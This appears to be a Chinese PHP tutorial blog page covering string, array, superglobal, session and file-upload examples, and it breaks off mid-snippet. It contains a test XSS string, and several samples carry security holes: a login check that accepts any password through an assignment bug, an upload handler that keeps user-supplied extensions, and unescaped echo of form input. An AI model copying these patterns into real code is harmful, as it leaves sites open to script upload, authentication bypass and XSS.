<h1 id="字符串函数使用"><a href="#字符串函数使用" class="headerlink" title="字符串函数使用"></a>字符串函数使用</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = <span class="string">"baidu"</span>;</span><br><span class="line">	$b = <span class="string">"taobao"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// $c = 'xxxx$a\txxxx';</span></span><br><span class="line">	<span class="comment">// $d = "xxxx$a\txxxx"; //双引号是解释变量，单引号不解释</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// echo "c=".$c."&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// echo "d=".$d."&lt;br/&gt;";</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//字符串的常用函数</span></span><br><span class="line">	header(<span class="string">"Content-type:text/html;charset=utf-8"</span>); <span class="comment">//解码</span></span><br><span class="line">	$a = <span class="string">"gylq.gitgylqhub.io.baidu.com.cn.baidu.com.cn"</span>;</span><br><span class="line">	$b = <span class="string">"背景"</span>; </span><br><span class="line"></span><br><span class="line">	<span class="comment">//strlen（返回字节长度）</span></span><br><span class="line">	<span class="comment">// echo strlen($b)."&lt;br/&gt;";//一个汉字占3个字节.返回字节长度  </span></span><br><span class="line">	<span class="comment">// echo $b; //</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//mb_strlen（返回解码长度的真实）</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"a mb_strlen = "</span>.mb_strlen($a,<span class="string">"utf-8"</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"b mb_strlen = "</span>.mb_strlen($b,<span class="string">"utf-8"</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//strpos  返回字符串第一次出现的位置</span></span><br><span class="line">	<span class="keyword">echo</span> strpos($a, <span class="string">'gi'</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//stripos（返回字符串第一次出现的位置不区分大小写）</span></span><br><span class="line">	<span class="keyword">echo</span> stripos($a,<span class="string">'Gi'</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//strrpos（从右边开始数）</span></span><br><span class="line">	<span class="keyword">echo</span> strrpos(<span class="string">"You love php, I love php too!"</span>,<span class="string">"php"</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//str_replace(替换函数) str_ireplace就是不区分大小写</span></span><br><span class="line">	$c = str_replace(gylq, baidu, $a);</span><br><span class="line">	<span class="keyword">echo</span> $c.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//strstr 查找字符串首次出现位置 stristr(不区分大小写)</span></span><br><span class="line">	<span class="keyword">echo</span> strstr($a,<span class="string">"g"</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//substr 截取字符串 strrchr(从右边截取)</span></span><br><span class="line">	<span class="comment">//strrchr 如果needle包含了不止一个字符，那么仅使用第一个字符。该行为不同于strstr()。</span></span><br><span class="line">	<span class="comment">//strrchr 如果needle不是一个字符串，那么将被转化为整型并被视为字符顺序值。</span></span><br><span class="line">	<span class="keyword">echo</span> substr($a, <span class="number">5</span>,<span class="number">10</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> strrchr($a, <span class="string">"b"</span>).<span class="string">"&lt;br/&gt;"</span>; <span class="comment">//取文件后缀名会用到</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//split 正则分割 explode 字符串分割成数组  implode 数组转化为字符串</span></span><br><span class="line">	$website = <span class="string">"gylq.github.io"</span>;</span><br><span class="line">	$arrstr = explode(<span class="string">"."</span>, $website);</span><br><span class="line">	print_r($arrstr);</span><br><span class="line">	$newsite = implode($arrstr,<span class="string">"."</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>.$newsite; </span><br><span class="line"></span><br><span class="line">	<span class="comment">//trim 去除首位的空格符 ltrim左边空格 rtrim右边空格</span></span><br><span class="line">	$user = <span class="string">"    userxxx     "</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>.trim($user).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>.$user.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//addslashes 自动过滤点引号变转义</span></span><br><span class="line">	<span class="comment">//htmlspecialchars</span></span><br><span class="line"></span><br><span class="line">	$xss = <span class="string">"&lt;script&gt;alert(123)&lt;/script&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> htmlspecialchars($xss);</span><br><span class="line">	<span class="keyword">echo</span> addslashes($xss);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="数组的一些操作"><a href="#数组的一些操作" class="headerlink" title="数组的一些操作"></a>数组的一些操作</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = <span class="string">"aaaa"</span>;</span><br><span class="line">	$b = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">	 $arr = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">"baidu"</span>,<span class="string">"shaghai"</span>); <span class="comment">//索引数组</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//print_r输出数组</span></span><br><span class="line">	<span class="comment">//count输出数组大小</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	 foreach ($arr as $key =&gt; $value) &#123;</span></span><br><span class="line"><span class="comment">	 	// code...</span></span><br><span class="line"><span class="comment">	 	echo $key,"----".$value."&lt;br/&gt;";</span></span><br><span class="line"><span class="comment">	 &#125;</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// $arr1 = array(</span></span><br><span class="line">	<span class="comment">// 		"aa"=&gt;"wuhan",</span></span><br><span class="line">	<span class="comment">// 		"bb"=&gt;10,</span></span><br><span class="line">	<span class="comment">// 		"cc"=&gt;"beijing"</span></span><br><span class="line">	<span class="comment">// );  // 关键型数组</span></span><br><span class="line">	<span class="comment">// foreach ($arr1 as $key =&gt; $value) &#123;</span></span><br><span class="line">	<span class="comment">// 	// code...</span></span><br><span class="line">	<span class="comment">// 	echo $key,"----".$value."&lt;br/&gt;"; </span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//数组的增删改查</span></span><br><span class="line">	 <span class="comment">// $arr = array("a","vv","cc");</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">// $arr[] = "ff"; //增</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">// unset($arr[1]); //删</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">// $arr[2]="gylq.github"; //改</span></span><br><span class="line">	 <span class="comment">// print_r($arr);</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">//each</span></span><br><span class="line">	 <span class="comment">//list  数组遍历</span></span><br><span class="line">	 <span class="comment">// while ($row = each($arr)) &#123;</span></span><br><span class="line">	 <span class="comment">// 	// code...</span></span><br><span class="line">	 <span class="comment">// 	list($k,$v) = $row;</span></span><br><span class="line">	 <span class="comment">// 	echo $k."---".$v."&lt;br/&gt;";</span></span><br><span class="line">	 <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">//array_key_exists() 判断键值是否存在</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">// $arr = array(</span></span><br><span class="line">	 <span class="comment">// 		"a"=&gt;"xxx",</span></span><br><span class="line">	 <span class="comment">// 		"b"=&gt;"xada",</span></span><br><span class="line">	 <span class="comment">// 		"c"=&gt;"777"</span></span><br><span class="line">	 <span class="comment">// );</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">// var_dump(array_key_exists("a", $arr));</span></span><br><span class="line">	 <span class="comment">// var_dump(in_array("777", $arr));</span></span><br><span class="line">	 <span class="comment">// var_dump(array_keys($arr));</span></span><br><span class="line"></span><br><span class="line">	 <span class="keyword">for</span>($i = <span class="number">1</span> ; $i&lt;<span class="number">10</span>; $i++)</span><br><span class="line">	 &#123;</span><br><span class="line">	 	<span class="keyword">for</span>($j = <span class="number">1</span>; $j&lt;= $i; $j++)</span><br><span class="line">	 	&#123;</span><br><span class="line">	 		<span class="keyword">echo</span> $j.<span class="string">"*"</span>.$i.<span class="string">"="</span>.($j*$i).<span class="string">"&amp;nbsp;&amp;nbsp "</span>;</span><br><span class="line">	 	&#125;</span><br><span class="line"></span><br><span class="line">	 	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	 &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="超全局变量的一些操作"><a href="#超全局变量的一些操作" class="headerlink" title="超全局变量的一些操作"></a>超全局变量的一些操作</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;POST&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"1.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">	用户：&lt;input type=<span class="string">"text"</span> name=<span class="string">"a1"</span>&gt;&lt;br/&gt;</span><br><span class="line">	密码：&lt;input type=<span class="string">"text"</span> name=<span class="string">"b1"</span>&gt;&lt;br/&gt;</span><br><span class="line">	&lt;input type=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// // 无参函数</span></span><br><span class="line">	<span class="comment">// function a()&#123;</span></span><br><span class="line">	<span class="comment">// 	echo "gylq.github.io&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// 	echo "123.github.io&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// 	echo "312.github.io&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// 	echo "gy222.github.io&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// 	echo "gy21lq.github.io&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// //调用函数</span></span><br><span class="line">	<span class="comment">// //a();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// //有参函数</span></span><br><span class="line">	<span class="comment">// function b($a, $c)&#123;</span></span><br><span class="line">	<span class="comment">// 	$x = $a * $a + $c * $c;</span></span><br><span class="line">	<span class="comment">// 	return $x;</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// $y = b(3,4);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// echo $y;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//超全局变量</span></span><br><span class="line">	<span class="comment">//GLOBALS 超全局数组</span></span><br><span class="line">	$y = <span class="string">"www.baidu.com"</span>;</span><br><span class="line">	<span class="comment">//var_dump($GLOBALS);</span></span><br><span class="line">	<span class="comment">//echo $y;</span></span><br><span class="line">	<span class="comment">// echo $GLOBALS['GLOBALS']["y"];</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//var_dump($_SERVER);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// echo $_SERVER["REMOTE_ADDR"];</span></span><br><span class="line">	<span class="comment">// echo "&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// echo $_SERVER["HTTP_USER_AGENT"];</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//GET测试</span></span><br><span class="line">	<span class="comment">// function getAdd($a,$b)&#123;</span></span><br><span class="line">	<span class="comment">// 	return $a+$b;</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// if(empty($_GET))&#123;</span></span><br><span class="line">	<span class="comment">// 	echo "no get&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// &#125;else&#123;</span></span><br><span class="line">	<span class="comment">// 	$x = $_GET["a"];</span></span><br><span class="line">	<span class="comment">// 	$y = $_GET["b"];</span></span><br><span class="line">	<span class="comment">// 	$c = getAdd($x,$y);</span></span><br><span class="line">	<span class="comment">// 	echo $c;</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//GET测试</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getAdd</span><span class="params">($a,$b)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> $a+$b;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($_GET))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"no get&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$x = $_GET[<span class="string">"a"</span>];</span><br><span class="line">		$y = $_GET[<span class="string">"b"</span>];</span><br><span class="line">		$c = getAdd($x,$y);</span><br><span class="line">		<span class="keyword">echo</span> $c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($_POST))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"no post&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$a = $_POST[<span class="string">"a1"</span>];</span><br><span class="line">		$b = $_POST[<span class="string">"b1"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"$a -- $b &lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//$_REQUEST = $_GET + $_POST</span></span><br><span class="line"></span><br><span class="line">	var_dump($_REQUEST);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="PHP的变量与作用"><a href="#PHP的变量与作用" class="headerlink" title="PHP的变量与作用"></a>PHP的变量与作用</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	</span><br><span class="line">	define(<span class="string">"PI"</span>,<span class="number">3.14</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// echo PI;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// var_dump(defined("PI")); //检测是否定义过</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//全局变量</span></span><br><span class="line">	<span class="comment">//局部变量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// echo "aaa";</span></span><br><span class="line">	<span class="comment">// echo "aaa";</span></span><br><span class="line">	<span class="comment">// echo "aaa";</span></span><br><span class="line">	<span class="comment">// echo "aaa";</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// $str = "www.x.com";</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">		$x = $x + <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"function a :"</span>.$x.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">b</span><span class="params">(&amp;$x)</span></span>&#123;</span><br><span class="line">		$x = $x + <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"function b :"</span>.$x.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">c</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $aa;</span><br><span class="line"></span><br><span class="line">		$x = $x * <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"function c: $x &lt;br/&gt;"</span>;</span><br><span class="line">		$aa++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$aa = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	c($aa);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"aa = $aa"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="PHP的会话技术操作"><a href="#PHP的会话技术操作" class="headerlink" title="PHP的会话技术操作"></a>PHP的会话技术操作</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">登陆页面 - 2.php</span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;session登陆测试&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;1.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">	用户：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;user&quot; &#x2F;&gt;</span><br><span class="line">	密码：&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;pass&quot; &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">验证页面 - 1.php</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	session_start();</span><br><span class="line"></span><br><span class="line">	if(empty($_POST))&#123;</span><br><span class="line">		echo &quot;无法登陆&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;a href&#x3D;&#39;2.php&#39;&gt;请登录&lt;&#x2F;a&gt;&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$name &#x3D; $_POST[&quot;user&quot;];</span><br><span class="line">		$pass &#x3D; $_POST[&quot;pass&quot;];</span><br><span class="line"></span><br><span class="line">		if($name &#x3D;&#x3D; &quot;admin&quot; &amp;&amp; $pass &#x3D; &quot;123&quot;)&#123;</span><br><span class="line">			$_SESSION[&#39;name&#39;]&#x3D;&quot;admin&quot;;</span><br><span class="line">			header(&quot;location: 5.php&quot;);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			echo &quot;用户名或密码错误&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;a href&#x3D;&#39;2.php&#39;&gt;请登录&lt;&#x2F;a&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">登陆成功页面 - 5.php</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	session_start();</span><br><span class="line"></span><br><span class="line">	if(empty($_SESSION))&#123;</span><br><span class="line">		echo &quot;无权登陆&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;a href&#x3D;&#39;2.php&#39;&gt;请登录&lt;&#x2F;a&gt;&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$name &#x3D; $_SESSION[&quot;name&quot;];</span><br><span class="line">		echo &quot;欢迎 $name 登陆系统&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<h1 id="PHP的文件操作"><a href="#PHP的文件操作" class="headerlink" title="PHP的文件操作"></a>PHP的文件操作</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">- - index.php</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	&#x2F;&#x2F; &#x2F;&#x2F; 文件包含</span><br><span class="line">	&#x2F;&#x2F; &#x2F;&#x2F; require include require_once include_once</span><br><span class="line">	&#x2F;&#x2F; echo &quot;www.x.com&lt;hr&#x2F;&gt;&quot;;</span><br><span class="line">	&#x2F;&#x2F; require_once &quot;array.php&quot;;  &#x2F;&#x2F;include报错还是执行</span><br><span class="line">	&#x2F;&#x2F; &#x2F;&#x2F;require报错不执行</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; echo &quot;xxxx&lt;hr&#x2F;&gt;&quot;;</span><br><span class="line">	&#x2F;&#x2F; require_once &quot;array.php&quot;;</span><br><span class="line">	&#x2F;&#x2F; echo &quot;xxxx&lt;hr&#x2F;&gt;&quot;;</span><br><span class="line">	&#x2F;&#x2F; require_once &quot;array.php&quot;;  &#x2F;&#x2F;只执行一次</span><br><span class="line">	&#x2F;&#x2F; echo &quot;xxxx&lt;hr&#x2F;&gt;&quot;;</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; echo realpath(&quot;..&#x2F;..&#x2F;&quot;); </span><br><span class="line">&#x2F;*</span><br><span class="line">	$fileNames &#x3D; opendir(&quot;.&quot;);  &#x2F;&#x2F;开文件夹</span><br><span class="line">	while($row  &#x3D; readdir($fileNames)) &#x2F;&#x2F;读文件</span><br><span class="line">	&#123;</span><br><span class="line">		echo $row.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	closedir($fileNames);</span><br><span class="line"></span><br><span class="line">	if(is_dir(&quot;2.php&quot;))&#123;</span><br><span class="line">		echo &quot;yes&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;no&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">*&#x2F;</span><br><span class="line">&#x2F;&#x2F;	unlink(&quot;12313.php&quot;); &#x2F;&#x2F;删除文件</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;file_get_contents() &#x2F;&#x2F;读取内容 &#x2F;&#x2F;file_put_contents写入内容</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; $str &#x3D; file_get_contents(&quot;array.php&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; var_dump($str);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;递归技巧</span><br><span class="line"></span><br><span class="line">	&#x2F;*</span><br><span class="line">	$path 目录</span><br><span class="line">	$lev 层级 进入一层，目录更深，明显显示出来</span><br><span class="line">	*&#x2F;</span><br><span class="line">	function showDir($path, $lev&#x3D;0)&#123;</span><br><span class="line">		$fh &#x3D; opendir($path);</span><br><span class="line">		while($row &#x3D; readdir($fh))&#123;</span><br><span class="line">			&#x2F;&#x2F;如果目录为.和..就跳过</span><br><span class="line">			if(($row &#x3D;&#x3D; &#39;.&#39;) || ($row &#x3D;&#x3D; &#39;..&#39;))&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line">			echo str_repeat(&quot;$nbsp;$nbsp;&quot;, $lev),$row,&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">			&#x2F;&#x2F;如果目录里还有目录，继续往下读目录</span><br><span class="line">			if(is_dir($path.&#39;&#x2F;&#39;.$row))&#123;</span><br><span class="line">				showdir($path.&#39;&#x2F;&#39;.$row,$lev+1);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		closedir($fh);</span><br><span class="line">	&#125;</span><br><span class="line">	showDir(&#39;..&#39;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-- array.php</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	&#x2F;&#x2F; var_dump($_FILES);</span><br><span class="line">	if(empty($_FILES))&#123;</span><br><span class="line">		echo &quot;请上传文件&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		&#x2F;&#x2F; echo $_FILES[&#39;pic&#39;][&#39;name&#39;].&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">		&#x2F;&#x2F; echo $_FILES[&#39;pic&#39;][&#39;tmp_name&#39;].&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">		define(&quot;PATH&quot;,__DIR__);</span><br><span class="line">		$path &#x3D; PATH.&quot;&#x2F;&quot;.&quot;upload&quot;.&quot;&#x2F;images&quot;;</span><br><span class="line">		$dir1 &#x3D; date(&quot;Ym&quot;);</span><br><span class="line">		$dir2 &#x3D; date(&quot;d&quot;);</span><br><span class="line">		$fullPath &#x3D; $path.&quot;&#x2F;&quot;.$dir1.&quot;&#x2F;&quot;.$dir2;</span><br><span class="line">		if(is_dir($fullPath))</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;yes&quot;;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			&#x2F;&#x2F;echo &quot;no&quot;;</span><br><span class="line">			mkdir($fullPath,0777,true);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$fileName &#x3D; rand(100000,999999);</span><br><span class="line">		$fileType &#x3D; strrchr($_FILES[&#39;pic&#39;][&#39;name&#39;], &quot;.&quot;);</span><br><span class="line">		$fileName &#x3D; $fileName.$fileType;</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($_FILES[&#39;pic&#39;][&#39;tmp_name&#39;], $fullPath.&quot;&#x2F;&quot;.$fileName);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">- -3.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;测试文件上传&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;array.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;pic&quot; &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">-- 4.php</span><br><span class="line">&lt;?php</span><br><span class="line">	&#x2F;&#x2F;D:\phpstudy pro\WWW</span><br><span class="line">	&#x2F;&#x2F;echo __DIR__.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">	&#x2F;&#x2F;D:\phpstudy pro</span><br><span class="line">	&#x2F;&#x2F;echo dirname(__DIR__);</span><br><span class="line">	define(&quot;PATH&quot;,__DIR__);</span><br><span class="line">	$path &#x3D; PATH.&quot;&#x2F;&quot;.&quot;upload&quot;.&quot;&#x2F;images&quot;;</span><br><span class="line">	$dir1 &#x3D; date(&quot;Ym&quot;);</span><br><span class="line">	$dir2 &#x3D; date(&quot;d&quot;);</span><br><span class="line">	$fullPath &#x3D; $path.&quot;&#x2F;&quot;.$dir1.&quot;&#x2F;&quot;.$dir2;</span><br><span class="line">	if(is_dir($fullPath))</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;yes&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		&#x2F;&#x2F;echo &quot;no&quot;;</span><br><span class="line">		mkdir($fullPath,0777,true);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">- - 6.php</span><br><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;1;</span><br><span class="line">	$b&#x3D;2;</span><br><span class="line">	$fh &#x3D; opendir(&#39;..&#39;);</span><br><span class="line">	while($row &#x3D; readdir($fh))</span><br><span class="line">			&#123;</span><br><span 